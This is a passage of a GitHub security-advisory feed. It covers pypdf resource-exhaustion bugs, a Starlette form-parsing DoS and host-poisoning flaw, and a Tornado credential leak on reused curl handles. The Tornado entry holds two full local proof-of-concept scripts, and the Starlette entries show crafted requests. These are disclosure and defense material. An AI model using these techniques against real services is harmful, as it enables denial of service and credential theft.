<p>This has been fixed in <a href="https://github.com/py-pdf/pypdf/releases/tag/6.13.0">pypdf==6.13.0</a>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If you cannot upgrade yet, consider applying the changes from PR <a href="https://github.com/py-pdf/pypdf/pull/3830">#3830</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/py-pdf/pypdf/security/advisories/GHSA-m2v9-299j-rv96">https://github.com/py-pdf/pypdf/security/advisories/GHSA-m2v9-299j-rv96</a></li>
<li><a href="https://github.com/py-pdf/pypdf/pull/3830">https://github.com/py-pdf/pypdf/pull/3830</a></li>
<li><a href="https://github.com/py-pdf/pypdf/releases/tag/6.13.0">https://github.com/py-pdf/pypdf/releases/tag/6.13.0</a></li>
<li><a href="https://github.com/advisories/GHSA-m2v9-299j-rv96">https://github.com/advisories/GHSA-m2v9-299j-rv96</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m2v9-299j-rv96</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-16T14:05:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pypdf] pypdf: Possible infinite loop when retrieving fonts for layout-mode text extraction]]></title>
        <id>https://github.com/advisories/GHSA-52x6-gq3r-vpf4</id>
        <link href="https://github.com/advisories/GHSA-52x6-gq3r-vpf4"/>
        <updated>2026-06-16T14:05:43.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An attacker who uses this vulnerability can craft a PDF which leads to an infinite loop. This requires extracting the text in layout mode.</p>
<h3 id="patches">Patches</h3>
<p>This has been fixed in <a href="https://github.com/py-pdf/pypdf/releases/tag/6.13.0">pypdf==6.13.0</a>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If you cannot upgrade yet, consider applying the changes from PR <a href="https://github.com/py-pdf/pypdf/pull/3830">#3830</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/py-pdf/pypdf/security/advisories/GHSA-52x6-gq3r-vpf4">https://github.com/py-pdf/pypdf/security/advisories/GHSA-52x6-gq3r-vpf4</a></li>
<li><a href="https://github.com/py-pdf/pypdf/pull/3830">https://github.com/py-pdf/pypdf/pull/3830</a></li>
<li><a href="https://github.com/py-pdf/pypdf/releases/tag/6.13.0">https://github.com/py-pdf/pypdf/releases/tag/6.13.0</a></li>
<li><a href="https://github.com/advisories/GHSA-52x6-gq3r-vpf4">https://github.com/advisories/GHSA-52x6-gq3r-vpf4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-52x6-gq3r-vpf4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-16T14:05:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pypdf] pypdf: Possible large memory usage for form XObjects during text extraction]]></title>
        <id>https://github.com/advisories/GHSA-j543-4vmf-qm7v</id>
        <link href="https://github.com/advisories/GHSA-j543-4vmf-qm7v"/>
        <updated>2026-06-16T13:47:10.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An attacker who uses this vulnerability can craft a PDF which leads to large memory usage. This requires extracting the text of a page which contains a form XObject with self-references.</p>
<h3 id="patches">Patches</h3>
<p>This has been fixed in <a href="https://github.com/py-pdf/pypdf/releases/tag/6.12.2">pypdf==6.12.2</a>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If you cannot upgrade yet, consider applying the changes from PR <a href="https://github.com/py-pdf/pypdf/pull/3805">#3805</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/py-pdf/pypdf/security/advisories/GHSA-j543-4vmf-qm7v">https://github.com/py-pdf/pypdf/security/advisories/GHSA-j543-4vmf-qm7v</a></li>
<li><a href="https://github.com/py-pdf/pypdf/pull/3805">https://github.com/py-pdf/pypdf/pull/3805</a></li>
<li><a href="https://github.com/py-pdf/pypdf/releases/tag/6.12.2">https://github.com/py-pdf/pypdf/releases/tag/6.12.2</a></li>
<li><a href="https://github.com/advisories/GHSA-j543-4vmf-qm7v">https://github.com/advisories/GHSA-j543-4vmf-qm7v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j543-4vmf-qm7v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-16T13:47:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pypdf] pypdf: Inefficient decoding of FlateDecode PNG predictor streams]]></title>
        <id>https://github.com/advisories/GHSA-5hgr-hg42-57jg</id>
        <link href="https://github.com/advisories/GHSA-5hgr-hg42-57jg"/>
        <updated>2026-06-16T13:46:42.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An attacker who uses this vulnerability can craft a PDF which leads to long runtimes. This requires accessing a stream which uses the <code>/FlateDecode</code> filter with a PNG predictor.</p>
<h3 id="patches">Patches</h3>
<p>This has been fixed in <a href="https://github.com/py-pdf/pypdf/releases/tag/6.12.2">pypdf==6.12.2</a>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If you cannot upgrade yet, consider applying the changes from PR <a href="https://github.com/py-pdf/pypdf/pull/3806">#3806</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/py-pdf/pypdf/security/advisories/GHSA-5hgr-hg42-57jg">https://github.com/py-pdf/pypdf/security/advisories/GHSA-5hgr-hg42-57jg</a></li>
<li><a href="https://github.com/py-pdf/pypdf/pull/3806">https://github.com/py-pdf/pypdf/pull/3806</a></li>
<li><a href="https://github.com/py-pdf/pypdf/releases/tag/6.12.2">https://github.com/py-pdf/pypdf/releases/tag/6.12.2</a></li>
<li><a href="https://github.com/advisories/GHSA-5hgr-hg42-57jg">https://github.com/advisories/GHSA-5hgr-hg42-57jg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5hgr-hg42-57jg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-16T13:46:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pypdf] pypdf: Manipulated XMP metadata streams can exhaust RAM]]></title>
        <id>https://github.com/advisories/GHSA-wjqc-6w8f-h24c</id>
        <link href="https://github.com/advisories/GHSA-wjqc-6w8f-h24c"/>
        <updated>2026-06-16T13:45:59.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An attacker who uses this vulnerability can craft a PDF which leads to large memory usage. This requires parsing large XMP metadata, possibly with lots of unnecessary elements.</p>
<h3 id="patches">Patches</h3>
<p>This has been fixed in <a href="https://github.com/py-pdf/pypdf/releases/tag/6.12.1">pypdf==6.12.1</a>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If you cannot upgrade yet, consider applying the changes from PR <a href="https://github.com/py-pdf/pypdf/pull/3796">#3796</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/py-pdf/pypdf/security/advisories/GHSA-wjqc-6w8f-h24c">https://github.com/py-pdf/pypdf/security/advisories/GHSA-wjqc-6w8f-h24c</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-48735">https://nvd.nist.gov/vuln/detail/CVE-2026-48735</a></li>
<li><a href="https://github.com/py-pdf/pypdf/pull/3796">https://github.com/py-pdf/pypdf/pull/3796</a></li>
<li><a href="https://github.com/py-pdf/pypdf/releases/tag/6.12.1">https://github.com/py-pdf/pypdf/releases/tag/6.12.1</a></li>
<li><a href="https://github.com/advisories/GHSA-wjqc-6w8f-h24c">https://github.com/advisories/GHSA-wjqc-6w8f-h24c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wjqc-6w8f-h24c</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-16T13:45:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[starlette] Starlette: request.form() limits silently ignored for application/x-www-form-urlencoded enable DoS]]></title>
        <id>https://github.com/advisories/GHSA-82w8-qh3p-5jfq</id>
        <link href="https://github.com/advisories/GHSA-82w8-qh3p-5jfq"/>
        <updated>2026-06-15T20:39:54.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>request.form()</code> accepts <code>max_fields</code> and <code>max_part_size</code> to bound resource consumption while parsing form data. These limits are enforced for <code>multipart/form-data</code>, but silently ignored for <code>application/x-www-form-urlencoded</code>. An unauthenticated attacker can therefore send a urlencoded body with an arbitrarily large number of fields or an arbitrarily large field, even when the application configured limits it believed would apply.</p>
<h3 id="details">Details</h3>
<p><code>request.form()</code> dispatches to a different parser depending on the <code>Content-Type</code>. For <code>multipart/form-data</code> the <code>max_files</code>, <code>max_fields</code>, and <code>max_part_size</code> limits are forwarded to the parser, but for <code>application/x-www-form-urlencoded</code> the parser is constructed without them. It has no <code>max_fields</code> or <code>max_part_size</code> parameter to receive them, and it appends every field with no count check and accumulates each field's name and value with no size check. The configured limits are therefore both unreachable and unenforced for url-encoded bodies.</p>
<p>Because the url-encoded parser does its work synchronously between stream reads, the two attack shapes have different effects:</p>
<ul>
<li><strong>Field count</strong> drives CPU and event-loop blocking. A body of ~1,000,000 fields (a sub-10MB payload such as <code>f0=v&amp;f1=v&amp;...</code>) blocks the worker's event loop for several seconds while parsing, during which the worker serves no other request.</li>
<li><strong>Field size</strong> drives memory. A single large field value (e.g. a 50MB value) is buffered in full to build the <code>FormData</code>, forcing memory allocation proportional to the request body.</li>
</ul>
<p>The equivalent <code>multipart/form-data</code> request is correctly rejected with <code>400 Too many fields</code> / <code>400 Field exceeded maximum size</code>.</p>
<h3 id="impact">Impact</h3>
<p>This Denial of service (DoS) vulnerability affects all applications built with Starlette (or FastAPI) that call <code>request.form()</code> on <code>application/x-www-form-urlencoded</code> requests. A single request with a very large number of fields blocks the event loop for several seconds, and a single request with a very large field forces unbounded memory allocation; in either case, parallel requests can render the service unusable. A reverse proxy that enforces a request body size limit reduces but does not eliminate the exposure, since a sub-10MB body is already enough to block the event loop.</p>
<h3 id="mitigation">Mitigation</h3>
<p>Upgrade to a patched version, which forwards <code>max_fields</code> and <code>max_part_size</code> to the url-encoded parser and enforces them while parsing, raising before the oversized field or excess fields are accumulated. The defaults match <code>multipart/form-data</code> (<code>max_fields=1000</code>, <code>max_part_size=1MB</code>) and can be customized via <code>request.form(max_fields=..., max_part_size=...)</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Kludex/starlette/security/advisories/GHSA-82w8-qh3p-5jfq">https://github.com/Kludex/starlette/security/advisories/GHSA-82w8-qh3p-5jfq</a></li>
<li><a href="https://github.com/advisories/GHSA-82w8-qh3p-5jfq">https://github.com/advisories/GHSA-82w8-qh3p-5jfq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-82w8-qh3p-5jfq</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-15T20:39:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Starlette] Starlette: Unvalidated request path concatenated into authority poisons request.url.hostname]]></title>
        <id>https://github.com/advisories/GHSA-jp82-jpqv-5vv3</id>
        <link href="https://github.com/advisories/GHSA-jp82-jpqv-5vv3"/>
        <updated>2026-06-15T20:38:11.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>In affected versions, the HTTP request path is not validated before being used to reconstruct <code>request.url</code>. Because <code>request.url</code> is rebuilt by concatenating <code>{scheme}://{host}{path}</code> and re-parsing the result, a path that does not begin with <code>/</code> (for example <code>@google.com</code>) moves the authority boundary during re-parsing, so <code>request.url.hostname</code> and <code>request.url.netloc</code> become attacker-controlled. Code that reads <code>request.url.hostname</code> (rather than the <code>Host</code> header or <code>scope</code>) can therefore be misled into trusting an attacker-supplied host.</p>
<h3 id="details">Details</h3>
<p>When a client requests a path that does not start with <code>/</code>:</p>
<pre><code class="language-http">GET @google.com HTTP/1.1
Host: localhost
</code></pre>
<p>affected versions reconstruct the URL as <code>http://localhost@google.com</code>. Per <a href="https://www.rfc-editor.org/rfc/rfc3986.html#section-3.2.1">RFC 3986 §3.2.1</a>, the substring before <code>@</code> in the authority is <code>userinfo</code>, so re-parsing yields <code>username = "localhost"</code> and <code>hostname = "google.com"</code>, with an empty path:</p>
<pre><code class="language-text">request.url          == "http://localhost@google.com"
request.url.hostname == "google.com"
request.url.path     == ""
</code></pre>
<p>The root cause is that the path is concatenated directly after the host without a separating <code>/</code>, and without validating that it begins with one. Only the <code>Host</code> header was validated when constructing <code>request.url</code>; the path was not.</p>
<p>This requires an ASGI server that forwards a request-target lacking a leading <code>/</code> into <code>scope["path"]</code>.</p>
<h3 id="impact">Impact</h3>
<p>Any application running an affected version that uses <code>request.url</code>, <code>request.url.netloc</code>, or <code>request.url.hostname</code> for a security-sensitive decision (host-based authorization, redirect/callback base, SSRF target, cache key, audit log) may be affected, when no fronting proxy or load balancer rejects the malformed request-target first.</p>
<p>Note that this is less exploitable than <a href="https://github.com/Kludex/starlette/security/advisories/GHSA-86qp-5c8j-p5mr">GHSA-86qp-5c8j-p5mr</a>: there, the poison is carried in the <code>Host</code> header, so the real path still routes to a valid endpoint while <code>request.url.path</code> lies. Here, the poison must be carried in the path itself, and that path (<code>@google.com</code>) does not match any registered route, so routing returns <code>404</code> and no endpoint handler runs. The exposure is limited to code that reads <code>request.url</code> before routing - notably middleware - or in 404/exception handlers.</p>
<h3 id="mitigation">Mitigation</h3>
<p>Upgrade to a patched version, which prevents the request path from crossing into the URL authority. The request above instead yields <code>http://localhost/@google.com</code> with <code>request.url.hostname == "localhost"</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Kludex/starlette/security/advisories/GHSA-jp82-jpqv-5vv3">https://github.com/Kludex/starlette/security/advisories/GHSA-jp82-jpqv-5vv3</a></li>
<li><a href="https://github.com/advisories/GHSA-jp82-jpqv-5vv3">https://github.com/advisories/GHSA-jp82-jpqv-5vv3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jp82-jpqv-5vv3</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-06-15T20:38:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tornado] Tornado: CurlAsyncHTTPClient leaks per-request credentials on handle reuse]]></title>
        <id>https://github.com/advisories/GHSA-pw6j-qg29-8w7f</id>
        <link href="https://github.com/advisories/GHSA-pw6j-qg29-8w7f"/>
        <updated>2026-06-15T20:37:26.000Z</updated>
        <content type="html"><![CDATA[<h1 id="curlasynchttpclient-leaks-per-request-credentials-on-handle-reuse">CurlAsyncHTTPClient leaks per-request credentials on handle reuse</h1>
<h2 id="summary">Summary</h2>
<p><code>CurlAsyncHTTPClient</code> pools and reuses <code>pycurl</code> handles across requests but does
not reset them between requests, and several per-request options are applied with
no clearing branch. As a result, sensitive state set by one request persists onto
a later request on the same client that does not set it. Two credential vectors
are demonstrated below — a client TLS certificate (<code>SSLCERT</code>/<code>SSLKEY</code>) and proxy
basic-auth credentials (<code>PROXYUSERPWD</code>) — both leaking to a different,
unintended host. This affects all released versions through 6.5.6.</p>
<h2 id="details">Details</h2>
<p>In <code>tornado/curl_httpclient.py</code>, handles are created once and returned to a free
list for reuse (<code>_process_queue</code> pops the handle at line 200, <code>_finish</code>
re-appends it at line 245), and <code>_curl_setup_request</code> is never preceded by
<code>curl.reset()</code>. The function clears <em>some</em> carried-over state on the reused handle
— <code>unsetopt(PROXYUSERPWD)</code> in the no-proxy branch (line 394), <code>unsetopt(USERPWD)</code>
when no auth is set (line 495), and the HTTP-method flag reset (lines 428-432) —
but other options have no equivalent clearing path and persist until a later
request sets them again.</p>
<p><strong>Vector A — client TLS certificate (<code>SSLCERT</code>/<code>SSLKEY</code>).</strong> Set-only, no clearing
branch:</p>
<pre><code class="language-python"># tornado/curl_httpclient.py (v6.5.6), lines 498-502
if request.client_cert is not None:
    curl.setopt(pycurl.SSLCERT, request.client_cert)

if request.client_key is not None:
    curl.setopt(pycurl.SSLKEY, request.client_key)
</code></pre>
<p>A request that sets <code>client_cert</code> leaves the certificate on the handle; a later
request without <code>client_cert</code> presents it during its TLS handshake.</p>
<p><strong>Vector B — proxy credentials (<code>PROXYUSERPWD</code>).</strong> <code>PROXYUSERPWD</code> is set only
inside the credentials branch and unset only in the no-proxy <code>else</code> branch:</p>
<pre><code class="language-python"># tornado/curl_httpclient.py (v6.5.6), lines 371-394
if request.proxy_host and request.proxy_port:
    curl.setopt(pycurl.PROXY, request.proxy_host)
    curl.setopt(pycurl.PROXYPORT, request.proxy_port)
    if request.proxy_username:                 # only place PROXYUSERPWD is set
        ...
        curl.setopt(pycurl.PROXYUSERPWD, credentials)
    ...
else:
    try:
        curl.unsetopt(pycurl.PROXY)
    except TypeError:
        curl.setopt(pycurl.PROXY, "")
    curl.unsetopt(pycurl.PROXYUSERPWD)         # only place it is unset
</code></pre>
<p>A request that sets a <em>new</em> <code>proxy_host</code> without <code>proxy_username</code> updates
<code>PROXY</code>/<code>PROXYPORT</code> but never reaches the <code>else</code>, so the previous request's
credentials persist and are sent to the new proxy.</p>
<p>The same class also affects <code>INTERFACE</code> (lines 365-366: set only when
<code>request.network_interface</code> is truthy, with no clearing branch), which is a
lower-severity instance — a later request can be bound to a network interface it
did not request. A single fix addresses all three (see Mitigation).</p>
<h2 id="poc">PoC</h2>
<p>Both reproduce against the pinned release using public API only
(<code>CurlAsyncHTTPClient</code>, <code>HTTPRequest</code>, and the documented per-request arguments).</p>
<h3 id="vector-a--client-tls-certificate">Vector A — client TLS certificate</h3>
<p>The two servers listen on different ports, so request B opens a fresh TCP+TLS
connection; the certificate can only reach server 2 via the persisted handle
option, not connection or session reuse.</p>
<pre><code>python3 -m venv venv
./venv/bin/pip install "tornado==6.5.6" pycurl cryptography
./venv/bin/python poc_client_cert.py
</code></pre>
<pre><code class="language-python">import asyncio
import datetime
import ipaddress
import os
import socket
import ssl
import sys
import tempfile
import threading

from cryptography import x509
from cryptography.x509.oid import NameOID, ExtendedKeyUsageOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa

from tornado.httpclient import HTTPRequest
from tornado.curl_httpclient import CurlAsyncHTTPClient


def _key():
    return rsa.generate_private_key(public_exponent=65537, key_size=2048)


def _ca():
    key = _key()
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "PoC-CA")])
    now = datetime.datetime.now(datetime.timezone.utc)
    cert = (
        x509.CertificateBuilder()
        .subject_name(name).issuer_name(name)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now - datetime.timedelta(minutes=1))
        .not_valid_after(now + datetime.timedelta(days=1))
        .add_extension(x509.BasicConstraints(ca=True, path_length=None), critical=True)
        .sign(key, hashes.SHA256())
    )
    return cert, key


def _leaf(cn, ca_cert, ca_key, ips=None, client=False):
    key = _key()
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, cn)])
    now = datetime.datetime.now(datetime.timezone.utc)
    b = (
        x509.CertificateBuilder()
        .subject_name(name).issuer_name(ca_cert.subject)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now - datetime.timedelta(minutes=1))
        .not_valid_after(now + datetime.timedelta(days=1))
        .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
    )
    if ips:
        b = b.add_extension(
            x509.SubjectAlternativeName([x509.IPAddress(ipaddress.ip_address(i)) for i in ips]),
            critical=False,
        )
    if client:
        b = b.add_extension(
            x509.ExtendedKeyUsage([ExtendedKeyUsageOID.CLIENT_AUTH]), critical=False
        )
    return b.sign(ca_key, hashes.SHA256()), key


def _pem(path, cert, key=None):
    with open(path, "wb") as fh:
        fh.write(cert.public_bytes(serialization.Encoding.PEM))
        if key is not None:
            fh.write(key.private_bytes(
                serialization.Encoding.PEM,
                serialization.PrivateFormat.TraditionalOpenSSL,
                serialization.NoEncryption(),
            ))


class TLSServer:
    def __init__(self, srv_pem, ca_pem, require):
        self.captures = []
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind(("127.0.0.1", 0))
        self.sock.listen(4)
        self.port = self.sock.getsockname()[1]
        self.ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        self.ctx.load_cert_chain(srv_pem)
        self.ctx.load_verify_locations(ca_pem)
        self.ctx.verify_mode = ssl.CERT_REQUIRED if require else ssl.CERT_OPTIONAL
        threading.Thread(target=self._serve, daemon=True).start()

    def _serve(self):
        while True:
            try:
                conn, _ = self.sock.accept()
            except OSError:
                return
            try:
                s = self.ctx.wrap_socket(conn, server_side=True)
                self.captures.append(s.getpeercert() or None)
                try:
                    s.recv(4096)
                    s.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nok")
                except Exception:
                    pass
                s.close()
            except Exception:
                self.captures.append("handshake-failed")
                conn.close()

    def stop(self):
        try:
            self.sock.close()
        except Exception:
            pass


def _cn(peer):
    if not peer or not isinstance(peer, dict):
        return None
    for rdn in peer.get("subject", ()):
        for k, v in rdn:
            if k == "commonName":
                return v
    return None


async def main():
    with tempfile.TemporaryDirectory() as tmp:
        ca_cert, ca_key = _ca()
        s1_cert, s1_key = _leaf("server1.local", ca_cert, ca_key, ips=["127.0.0.1"])
        s2_cert, s2_key = _leaf("server2.local", ca_cert, ca_key, ips=["127.0.0.1"])
        cli_cert, cli_key = _leaf("trusted-client", ca_cert, ca_key, client=True)

        ca_pem = os.path.join(tmp, "ca.pem")
        s1_pem = os.path.join(tmp, "s1.pem")
        s2_pem = os.path.join(tmp, "s2.pem")
        cert_pem = os.path.join(tmp, "client.crt")
        key_pem = os.path.join(tmp, "client.key")
        _pem(ca_pem, ca_cert)
        _pem(s1_pem, s1_cert, s1_key)
        _pem(s2_pem, s2_cert, s2_key)
        _pem(cert_pem, cli_cert)
        with open(key_pem, "wb") as fh:
            fh.write(cli_key.private_bytes(
                serialization.Encoding.PEM,
                serialization.PrivateFormat.TraditionalOpenSSL,
                serialization.NoEncryption(),
            ))

        s1 = TLSServer(s1_pem, ca_pem, require=True)
        s2 = TLSServer(s2_pem, ca_pem, require=False)
        try:
            clean = CurlAsyncHTTPClient(max_clients=1, force_instance=True)
            await clean.fetch(HTTPRequest(
                f"https://127.0.0.1:{s2.port}/baseline",
                ca_certs=ca_pem, request_timeout=5), raise_error=False)
            clean.close()

            client = CurlAsyncHTTPClient(max_clients=1, force_instance=True)
            await client.fetch(HTTPRequest(
                f"https://127.0.0.1:{s1.port}/internal-mtls",
                client_cert=cert_pem, client_key=key_pem,
                ca_certs=ca_pem, request_timeout=5), raise_error=False)
            await client.fetch(HTTPRequest(
                f"https://127.0.0.1:{s2.port}/other-host",
                ca_certs=ca_pem, request_timeout=5), raise_error=False)
            await asyncio.sleep(0.2)
            client.close()
        finally:
            s1.stop()
            s2.stop()

        baseline = _cn(s2.captures[0]) if s2.captures else None
        leaked = _cn(s2.captures[1]) if len(s2.captures) &gt; 1 else None

        print(f"{'scenario':&lt;48}{'cert presented to server 2'}")
        print(f"{'-' * 48}{'-' * 28}")
        print(f"{'baseline: clean client, no client_cert':&lt;48}{baseline!r}")
        print(f"{'exploit: reused handle (A had client_cert)':&lt;48}{leaked!r}")
        print()
        print(f"(sanity) server 1 (mTLS required) saw: {_cn(s1.captures[0]) if s1.captures else None!r}")
        print()
        if baseline is None and leaked == "trusted-client":
            print("VERDICT: VULNERABLE — the client certificate from request A was "
                  "presented to server 2 on request B, which specified none.")
            return 0
        print(f"VERDICT: not reproduced (baseline={baseline!r} leaked={leaked!r})")
        return 2


if __name__ == "__main__":
    sys.exit(asyncio.run(main()))
</code></pre>
<p>Output (<code>pip show tornado</code> → 6.5.6, installed in the venv):</p>
<pre><code>scenario                                        cert presented to server 2
----------------------------------------------------------------------------
baseline: clean client, no client_cert          None
exploit: reused handle (A had client_cert)      'trusted-client'

(sanity) server 1 (mTLS required) saw: 'trusted-client'

VERDICT: VULNERABLE — the client certificate from request A was presented to
server 2 on request B, which specified none.
</code></pre>
<h3 id="vector-b--proxy-credentials">Vector B — proxy credentials</h3>
<p>Each proxy is a separate listener capturing the raw request bytes.</p>
<pre><code>./venv/bin/python poc_proxy_creds.py
</code></pre>
<pre><code class="language-python">import asyncio
import base64
import socket
import sys
import threading

from tornado.httpclient import HTTPRequest
from tornado.curl_httpclient import CurlAsyncHTTPClient


class CapturingProxy:
    def __init__(self):
        self.captures = []
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind(("127.0.0.1", 0))
        self.sock.listen(4)
        self.port = self.sock.getsockname()[1]
        threading.Thread(target=self._serve, daemon=True).start()

    def _serve(self):
        while True:
            try:
                conn, _ = self.sock.accept()
            except OSError:
                return
            try:
                data = b""
                while b"\r\n\r\n" not in data and len(data) &lt; 8192:
                    chunk = conn.recv(2048)
                    if not chunk:
                        break
                    data += chunk
                self.captures.append(data)
                conn.sendall(b"HTTP/1.1 502 Bad Gateway\r\nContent-Length: 0\r\n"
                             b"Connection: close\r\n\r\n")
            except Exception:
                pass
            finally:
                conn.close()

    def stop(self):
        try:
            self.sock.close()
        except Exception:
            pass


def proxy_authz(raw):
    head = raw.split(b"\r\n\r\n", 1)[0].decode("latin1", "replace")
    for line in head.split("\r\n"):
        if line.lower().startswith("proxy-authorization:"):
            return line
    return None


async def main():
    proxy_a = CapturingProxy()
    proxy_b = CapturingProxy()
    try:
        client = CurlAsyncHTTPClient(max_clients=1, force_instance=True)
        await client.fetch(HTTPRequest(
            "http://target.example/a",
            proxy_host="127.0.0.1", proxy_port=proxy_a.port,
            proxy_username="alice", proxy_password="secretA",
            request_timeout=5, connect_timeout=5), raise_error=False)
        await client.fetch(HTTPRequest(
            "http://target.example/b",
            proxy_host="127.0.0.1", proxy_port=proxy_b.port,
            request_timeout=5, connect_timeout=5), raise_error=False)
        await asyncio.sleep(0.2)
        client.close()
    finally:
        proxy_a.stop()
        proxy_b.stop()

    a = proxy_authz(proxy_a.captures[0]) if proxy_a.captures else None
    b = proxy_authz(proxy_b.captures[0]) if proxy_b.captures else None
    expected = "Basic " + base64.b64encode(b"alice:secretA").decode()

    print(f"{'request':&lt;42}{'Proxy-Authorization seen by that proxy'}")
    print(f"{'-' * 42}{'-' * 40}")
    print(f"{'A -&gt; proxy A (alice:secretA specified)':&lt;42}{a or '(none)'}")
    print(f"{'B -&gt; proxy B (NO credentials specified)':&lt;42}{b or '(none)'}")
    print()
    if b and expected in b:
        print(f"VERDICT: VULNERABLE — proxy B received alice's credentials "
              f"({expected}) although request B specified no proxy_username.")
        return 0
    print(f"VERDICT: not reproduced (proxy B saw: {b!r})")
    return 2


if __name__ == "__main__":
    sys.exit(asyncio.run(main()))
</code></pre>
<p>Output (<code>YWxpY2U6c2VjcmV0QQ==</code> decodes to <code>alice:secretA</code>):</p>
<pre><code>request                                   Proxy-Authorization seen by that proxy
----------------------------------------------------------------------------------
A -&gt; proxy A (alice:secretA specified)    Proxy-Authorization: Basic YWxpY2U6c2VjcmV0QQ==
B -&gt; proxy B (NO credentials specified)   Proxy-Authorization: Basic YWxpY2U6c2VjcmV0QQ==

VERDICT: VULNERABLE — proxy B received alice's credentials (Basic
YWxpY2U6c2VjcmV0QQ==) although request B specified no proxy_username.
</code></pre>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Type:</strong> Exposure of credentials to an unintended party (CWE-200), via reuse
of a resource whose sensitive state was not cleared (CWE-672).</li>
<li><strong>Actors:</strong> An application that issues requests with differing per-request
options on a shared <code>CurlAsyncHTTPClient</code> — for Vector A, mixing per-request
<code>client_cert</code> requests with non-certificate requests; for Vector B,
multiplexing requests across more than one proxy with per-proxy credentials.</li>
<li><strong>Effect:</strong> For Vector A, the client completes the TLS client-authentication
handshake — proving possession of the private key and disclosing the
certificate subject and chain — to a host that was never meant to receive it.
For Vector B, proxy basic-auth credentials are transmitted (base64) to a
different proxy. If the unintended host/proxy is attacker-controlled or
attacker-influenced (a user-supplied URL, webhook target, SSRF-reachable
endpoint, or a proxy chosen from user-controlled configuration), the credential
is disclosed to the attacker.</li>
<li><strong>Scope:</strong> Only applications using the optional <code>CurlAsyncHTTPClient</code> backend
with the patterns above are affected. The default <code>SimpleAsyncHTTPClient</code> is not
affected (and does not support proxies).</li>
</ul>
<p>Proposed CWE: CWE-200 / CWE-672. Proposed CVSS 3.1:
<code>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N</code> (5.9, medium); attack complexity is
High because exploitation depends on the application using differing per-request
options on a shared client and on handle scheduling.</p>
<h2 id="mitigation">Mitigation</h2>
<p>A single fix closes all instances of this class: call <code>curl.reset()</code> at the start
of <code>_curl_setup_request</code> and then re-apply the per-request options, so no state
from a prior request can persist on the reused handle. (Note <code>curl.reset()</code> also
clears <code>CAINFO</code>, which the current code intentionally leaves untouched — see the
comment at lines 401-409 — so that default would need to be re-established after
the reset.)</p>
<p>Alternatively, add explicit clearing branches mirroring the existing
<code>PROXYUSERPWD</code>/<code>USERPWD</code> handling:</p>
